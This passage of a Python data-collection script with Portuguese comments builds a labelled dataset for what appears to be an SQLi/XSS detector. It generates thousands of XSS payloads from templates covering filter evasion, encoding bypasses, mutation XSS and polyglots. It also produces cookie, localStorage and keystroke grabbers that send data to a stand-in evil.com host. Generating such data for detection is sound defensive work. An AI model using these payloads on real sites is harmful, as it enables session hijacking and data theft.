            return f"?{p}={payload}&{n2}={v}"
        if kind == "form":
            return f"{p}={payload}&{n2}={v}&action=submit"
        if kind == "path":
            return f"/app/{_r(5)}/{payload}"
        return payload  # raw — sem contexto

    def _attr() -> str:
        """Atributo HTML aleatório (id, class, name) para diversificar tags."""
        kind = random.choice(["id", "class", "name", "data-x"])
        return f'{kind}="{_r(6)}"'

    # ------------------------------------------------------------------
    # Funções JS representativas usadas em PoC de XSS reais.
    # Parametrizadas com valores aleatórios para gerar variantes únicas.
    # Ref: LiveOverflow — DO NOT USE alert(1) for XSS;
    #      Ways to alert(document.domain) — Tom Hudson (2018)
    # ------------------------------------------------------------------
    def _js() -> str:
        funcs = [
            f"alert({_ri(1, 99)})",
            f"alert('XSS{_r(3)}')",
            "alert(document.domain)",
            "alert(window.origin)",
            f"confirm({_ri(1, 99)})",
            "confirm(document.domain)",
            f"prompt({_ri(1, 99)})",
            "prompt(document.domain)",
            f"console.log('{_r(5)}')",
            "console.log(document.domain)",
            "alert(document.cookie)",
            f"eval('alert({_ri(1,9)})')",
            "alert(String.fromCharCode(88,83,83))",
            f"alert(Math.random()*{_ri(100,999)}|0)",
            f"setTimeout(alert,{_ri(0,100)},{_ri(1,9)})",
        ]
        return random.choice(funcs)

    # ------------------------------------------------------------------
    # Categoria 1 — Script tag básico
    # Ref: PortSwigger XSS Cheat Sheet (set. 2019)
    # ------------------------------------------------------------------
    def _cat1():
        f = _js()
        a = _attr()
        tmpl = random.choice([
            lambda: f"<script>{f}</script>",
            lambda: f"<script {a}>{f}</script>",
            lambda: f"><script>{f}</script>",
            lambda: f'"><script {a}>{f}</script>',
            lambda: f"'><script>{f}</script>",
            lambda: f"<SCRIPT>{f}</SCRIPT>",
            lambda: f"<Script {a}>{f}</Script>",
            lambda: f"<script defer>{f}</script>",
            lambda: f"<script type='text/javascript'>{f}</script>",
            lambda: f"<script type='text/javascript' {a}>{f}</script>",
        ])
        return _ctx(tmpl())

    # ------------------------------------------------------------------
    # Categoria 2 — Tags quebradas / aninhadas (filter evasion)
    # Ref: Bypassing Signature-Based XSS Filters (PortSwigger, 2020)
    #      mXSS Attacks — Heiderich et al. (2013)
    # ------------------------------------------------------------------
    def _cat2():
        f = _js()
        tmpl = random.choice([
            lambda: f"<scr<script>ipt>{f}</scr<script>ipt>",
            lambda: f"<script>{f}",
            lambda: f"<script/>{f}</script>",
            lambda: f"<script\n {_attr()}>{f}</script>",
            lambda: f"<script\t>{f}</script>",
            lambda: f"<<script>>{f}<</script>>",
            lambda: f"<script >{f}< /script>",
            lambda: f"</script><script {_attr()}>{f}</script>",
            lambda: f"<script>/*{_r(4)}*/{f}</script>",
            lambda: f"<script>// {_r(6)}\n{f}</script>",
        ])
        return _ctx(tmpl())

    # ------------------------------------------------------------------
    # Categoria 3 — Encoding bypasses (Unicode, entidades HTML, hex,
    #               URL-encoding)
    # Ref: Xssing Web With Unicodes — Rakesh Mane (ago. 2017)
    #      Encoding Differentials: Why Charset Matters — Schiller (2024)
    # ------------------------------------------------------------------
    def _cat3():
        f = _js()
        n = _ri(1, 99)
        tmpl = random.choice([
            lambda: f"<script>\\u0061lert({n})</script>",
            lambda: f"<script>\\x61lert({n})</script>",
            lambda: f"<script>eval('\\x61lert({n})')</script>",
            lambda: f"<IMG SRC={_ri(1,9)} ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;({n})>",
            lambda: f"<img src={_r(3)} onerror=&#97;&#108;&#101;&#114;&#116;({n})>",
            lambda: f"<script>eval(String.fromCharCode(97,108,101,114,116,40,{n},41))</script>",
            lambda: f"%3Cscript%3E{f}%3C%2Fscript%3E",
            lambda: f"&lt;script&gt;{f}&lt;/script&gt;",
            # parseInt("confirm",30)==8680439 — ofuscação por base numérica
            # Ref: PortSwigger XSS Cheat Sheet (2019)
            lambda: f"<script>eval(8680439..toString(30))(983801..toString(36))</script>",
            lambda: f"<script {_attr()}>\\152\\141\\166\\141\\163\\143\\162\\151\\160\\164\\072{f}</script>",
        ])
        return _ctx(tmpl())

    # ------------------------------------------------------------------
    # Categoria 4 — IMG event handlers
    # Ref: PortSwigger XSS Cheat Sheet (set. 2019)
    # ------------------------------------------------------------------
    def _cat4():
        f = _js()
        src = random.choice([f"x{_ri(1,9)}", f"{_r(3)}.png", f"{_ri(1,99)}", "x"])
        tmpl = random.choice([
            lambda: f"<img src={src} onerror={f}>",
            lambda: f"<img src={src} onerror={f}//",
            lambda: f'<img src={src} onerror="{f}">',
            lambda: f"<img src={src} {_attr()} onerror={f}>",
            lambda: f"><img src={src} onerror={f}>",
            lambda: f'"><img src={src} onerror="{f}">',
            lambda: f"<><img src={src} onerror={f}>",
            lambda: f"<img src=x:alert(alt) onerror=eval(src) alt={_r(4)}>",
            lambda: f"<img {_attr()} src={src} onerror={f}>",
        ])
        return _ctx(tmpl())

    # ------------------------------------------------------------------
    # Categoria 5 — SVG payloads
    # Ref: PortSwigger XSS Cheat Sheet (set. 2019); noraj — Short SVG
    # ------------------------------------------------------------------
    def _cat5():
        f = _js()
        tmpl = random.choice([
            lambda: f"<svg onload={f}>",
            lambda: f"<svg/onload={f}>",
            lambda: f"<svg {_attr()} onload={f}>",
            lambda: f'<svg/onload="{f}">',
            lambda: f'"><svg/onload={f}>',
            lambda: f"<svg><script {_attr()}>{f}</script>",
            lambda: f'<svg xmlns="http://www.w3.org/2000/svg" onload="{f}"/>',
            lambda: f"<svg><desc><![CDATA[</desc><script>{f}</script>]]></svg>",
            lambda: f"<svg><title><![CDATA[</title><script>{f}</script>]]></svg>",
            lambda: f"<svg><animatetransform onbegin=\"{f}\"></animatetransform></svg>",
            lambda: f"<svg {_attr()}><script>{f}</script></svg>",
        ])
        return _ctx(tmpl())

    # ------------------------------------------------------------------
    # Categoria 6 — HTML5 tags com event handlers não-óbvios
    # Ref: PortSwigger XSS Cheat Sheet (set. 2019)
    #      Ways to alert(document.domain) — Tom Hudson (@tomnomnom, 2018)
    # ------------------------------------------------------------------
    def _cat6():
        f = _js()
        tmpl = random.choice([
            lambda: f"<body onload={f}>",
            lambda: f"<input {_attr()} autofocus onfocus={f}>",
            lambda: f"<select {_attr()} autofocus onfocus={f}>",
            lambda: f"<textarea {_attr()} autofocus onfocus={f}>",
            lambda: f"<video/poster/onerror={f}>",
            lambda: f'<video {_attr()}><source onerror="javascript:{f}">',
            lambda: f'<video src={_r(3)} onloadstart="{f}">',
            lambda: f'<details/open/ontoggle="{f}">',
            lambda: f"<audio src={_r(3)} onloadstart={f}>",
            lambda: f"<marquee {_attr()} onstart={f}>",
            lambda: f"<meter value={_ri(1,9)} min=0 max=10 onmouseover={f}>{_ri(1,9)} out of 10</meter>",
            lambda: f"<body ontouchstart={f}>",
            lambda: f"<keygen {_attr()} autofocus onfocus={f}>",
        ])
        return _ctx(tmpl())

    # ------------------------------------------------------------------
    # Categoria 7 — Div / pointer events
    # Ref: PortSwigger XSS Cheat Sheet (set. 2019)
    # ------------------------------------------------------------------
    def _cat7():
        f = _js()
        label = random.choice(["MOVE HERE", "hover", "click", "touch", _r(5)])
        tmpl = random.choice([
            lambda: f'<div {_attr()} onpointerover="{f}">{label}</div>',
            lambda: f'<div {_attr()} onpointerdown="{f}">{label}</div>',
            lambda: f'<div {_attr()} onpointerenter="{f}">{label}</div>',
            lambda: f'<div {_attr()} onpointermove="{f}">{label}</div>',
            lambda: f'<div {_attr()} onpointerup="{f}">{label}</div>',
            lambda: f'<div {_attr()} onpointerout="{f}">{label}</div>',
            lambda: f'<div {_attr()} onclick="{f}">{label}</div>',
            lambda: f'<div {_attr()} onmouseover="{f}">{label}</div>',
        ])
        return _ctx(tmpl())

    # ------------------------------------------------------------------
    # Categoria 8 — URI wrappers (javascript:, data:, encodings do
    #               esquema para bypass de filtros)
    # Ref: Twitter XSS via javascript scheme — Sergey Bobrov (set. 2017)
    #      PortSwigger XSS Cheat Sheet — XSS in Wrappers for URI (2019)
    # ------------------------------------------------------------------
    def _cat8():
        f = _js()
        tmpl = random.choice([
            lambda: f"javascript:{f}",
            lambda: f"javascript:prompt({_ri(1,99)})",
            lambda: f"java%0ascript:{f}",        # LF entre java e script
            lambda: f"java%09script:{f}",        # tab horizontal
            lambda: f"java%0dscript:{f}",        # CR
            lambda: f"javascript://{_r(4)}%0A{f}",
            lambda: f"\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3a{f}",
            lambda: f"data:text/html,<script {_attr()}>{f}</script>",
            lambda: f"data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+",
            lambda: f'<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>',
            lambda: f'<a href="javascript:{f}" {_attr()}>link</a>',
        ])
        return _ctx(tmpl())

    # ------------------------------------------------------------------
    # Categoria 9 — Data grabbers (exfiltração de cookie / localStorage)
    # Ref: XSS by Tossing Cookies — WeSecureApp (jul. 2017)
    #      XSS in Uber via Cookie — zhchbin (ago. 2017)
    # ------------------------------------------------------------------
    def _cat9():
        host = f"{_r(6)}.evil.com"
        port = random.choice([80, 443, 8080, _ri(1024, 9999)])
        key = random.choice(["access_token", "session_id", "auth", "token", f"key_{_r(3)}"])
        tmpl = random.choice([
            lambda: f"<script>document.location='http://{host}/grab?c='+document.cookie</script>",
            lambda: f'<script>new Image().src="http://{host}:{port}/c="+document.cookie;</script>',
            lambda: f"<script>new Image().src=\"http://{host}/c=\"+localStorage.getItem('{key}');</script>",
            lambda: f"<img src=x onerror='document.onkeypress=function(e){{fetch(\"http://{host}?k=\"+String.fromCharCode(e.which))}},this.remove();'>",
            lambda: f"<script>fetch('https://{host}',{{method:'POST',mode:'no-cors',body:document.cookie}});</script>",
            lambda: f"<script>new XMLHttpRequest().open('GET','//{host}?c='+document.cookie,true);new XMLHttpRequest().send()</script>",
            lambda: f"<script>navigator.sendBeacon('https://{host}',document.cookie)</script>",
        ])
        return _ctx(tmpl())

    # ------------------------------------------------------------------
    # Categoria 10 — Mutation XSS (mXSS)
    # Ref: Write-up of DOMPurify 2.0.0 bypass — Michał Bentkowski (2019)
    #      mXSS Attacks — Heiderich, Schwenk, Frosch, Magazinius, Yang (2013)
    #      Mutation XSS in Google Search — Tomasz Andrzej Nidecki (2019)
    # ------------------------------------------------------------------
    def _cat10():
        n = _ri(1, 99)
        tmpl = random.choice([
            lambda: f'<noscript><p title="</noscript><img src={_r(3)} onerror=alert({n})>">',
            lambda: f"<svg><script>alert&lpar;'{_r(4)}'&rpar;",
            lambda: f"<svg {_attr()}><script>alert('{_r(4)}')",
            lambda: f'<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;{n}&#x29;">',
            lambda: f'<noscript><p title="</noscript><svg onload=alert({n})>">',
            lambda: f"<svg><desc><![CDATA[</desc><script>alert({n})</script>]]></svg>",
            lambda: f"<svg><foreignObject><![CDATA[</foreignObject><script>alert({n})</script>]]></svg>",
            lambda: f"<svg><title><![CDATA[</title><script>alert({n})</script>]]></svg>",
            lambda: f'<noscript><p {_attr()} title="</noscript><img src=x onerror=alert({n})>">',
        ])
        return _ctx(tmpl())

    # ------------------------------------------------------------------
    # Categoria 11 — Polyglot payloads
    # Ref: Unleashing an Ultimate XSS Polyglot — Ahmed Elsobky (fev. 2018)
    #      XSS ghettoBypass — d3adend (set. 2015)
    # ------------------------------------------------------------------
    def _cat11():
        n = _ri(1, 99)
        f = _js()
        tmpl = random.choice([
            lambda: f"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert({n})//'>",
            lambda: f'">\'><img src={_r(3)} onerror=alert({n})><a href="javascript:alert({n})">xss</a>',
            lambda: f"<script>alert({n})</script><img src=x onerror=alert({n+1})><svg onload=alert({n+2})>",
            lambda: f"\"'><script>alert(String.fromCharCode(88,83,83))</script>",
            lambda: f'<a href="javascript:alert(document.domain)" {_attr()}>Click</a>',
            lambda: f"<script {_attr()}>debugger;</script>",
            lambda: f"<script>alert(document.domain.concat(\"\\n\").concat(window.origin))</script>",
            lambda: f'">\'><svg/onload={f}><script {_attr()}>alert({n})</script>',
        ])
        return _ctx(tmpl())

    # ------------------------------------------------------------------
    # Categoria 12 — JS context escapes
    # Ref: PortSwigger XSS Cheat Sheet — XSS in JS Context (set. 2019)
    # ------------------------------------------------------------------
    def _cat12():
        n = _ri(1, 99)
        r = _r(4)
        f = _js()
        tmpl = random.choice([
            lambda: f"-(confirm)(document.domain)//",
            lambda: f"; alert({n});//{r}",
            lambda: f"'; alert({n});//{r}",
            lambda: f'\"; alert({n});//{r}',
            lambda: f"</script><script {_attr()}>alert({n})</script>",
            lambda: f"</script><img src={r} onerror=alert({n})>",
            lambda: f"'; alert(document.domain); var {r}='",
            lambda: f"\\';<script>alert({n})</script>",
            lambda: f"`);//{r}\nalert({n})//",
            lambda: f"}}catch(e){{}}alert({n})//",
        ])
        return _ctx(tmpl())

    # ------------------------------------------------------------------
    # Todas as categorias com nome para rastreabilidade no campo source
    # ------------------------------------------------------------------
    CATEGORIES = [
        ("script_basic",   _cat1),
        ("broken_tags",    _cat2),
        ("encoding",       _cat3),
        ("img_handlers",   _cat4),
        ("svg_payloads",   _cat5),
        ("html5_events",   _cat6),
        ("div_pointer",    _cat7),
        ("uri_wrappers",   _cat8),
        ("data_grabbers",  _cat9),
        ("mutation_xss",   _cat10),
        ("polyglot",       _cat11),
        ("js_context",     _cat12),
    ]

    records = []
    per_category = n // len(CATEGORIES)

    for cat_name, gen_fn in CATEGORIES:
        for _ in range(per_category):
            records.append({
                "payload": gen_fn(),
                "label": "xss",
                "source": f"augmented_xss_{cat_name}",
            })

    # Completar eventuais amostras restantes por arredondamento
    while len(records) < n:
        cat_name, gen_fn = random.choice(CATEGORIES)
        records.append({
            "payload": gen_fn(),
            "label": "xss",
            "source": f"augmented_xss_{cat_name}",
        })

    df = pd.DataFrame(records[:n])
    print(f"  [OK] XSS augmentado: {len(df):,} amostras — {len(CATEGORIES)} categorias")
    for cat_name, _ in CATEGORIES:
        cnt = len(df[df["source"] == f"augmented_xss_{cat_name}"])
        print(f"       - {cat_name:<20s}: {cnt:,}")
    return df


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    print("=" * 60)
    print("ESTÁGIO 1 — Coleta de dados")
    print("=" * 60)

    all_frames = []

    print("\n[A] Carregando datasets Kaggle...")
    df_kaggle = load_kaggle_files()
    if not df_kaggle.empty:
        all_frames.append(df_kaggle)

    print("\n[B] Carregando CSIC 2010...")
    df_csic = load_csic_files()
    if not df_csic.empty:
        all_frames.append(df_csic)

    print("\n[C] Gerando tráfego legítimo sintético...")
    df_synth = build_synthetic_legit(n=150000)
    all_frames.append(df_synth)

    print("\n[D] Gerando XSS augmentado (técnicas documentadas)...")
    df_xss_aug = build_xss_augmented(n=200_000)
    all_frames.append(df_xss_aug)

    print("\n[E] Carregando SecLists (XSS + SQLi reais)...")
    df_seclists = load_seclists()
    if not df_seclists.empty:
        all_frames.append(df_seclists)

    # Concatenar tudo
    df = pd.concat(all_frames, ignore_index=True)
    df["payload"] = df["payload"].astype(str).str.strip()
    df = df[df["payload"].str.len() >= 4]

    # Validar labels
    valid_labels = {"benign", "sqli", "xss"}
    invalid = df[~df["label"].isin(valid_labels)]
    if not invalid.empty:
        print(f"\n  [AVISO] {len(invalid)} linhas com label inválido — removendo.")
        df = df[df["label"].isin(valid_labels)]

    # Estatísticas finais
    print("\n" + "=" * 60)
    print("DISTRIBUIÇÃO FINAL DE CLASSES")
    print("=" * 60)
    counts = df["label"].value_counts()
    total = len(df)
    for label, cnt in counts.items():
        print(f"  {label:10s}: {cnt:7,d}  ({cnt/total*100:.1f}%)")
    print(f"  {'TOTAL':10s}: {total:7,d}")

    n_benign = counts.get("benign", 0)
    n_malicious = counts.get("sqli", 0) + counts.get("xss", 0)
    if n_benign < n_malicious:
        print(f"\n  *** ALERTA: benign ({n_benign}) é MINORIA em relação a maliciosos ({n_malicious})!")
        print("      Considere aumentar a geração sintética ou adicionar mais fontes legítimas.")

    # Salvar
    df.to_csv(OUTPUT_FILE, index=False)
    size_kb = OUTPUT_FILE.stat().st_size / 1024
    print(f"\n[SALVO] {OUTPUT_FILE}  ({total:,} linhas, {size_kb:.1f} KB)")


if __name__ == "__main__":
    main()
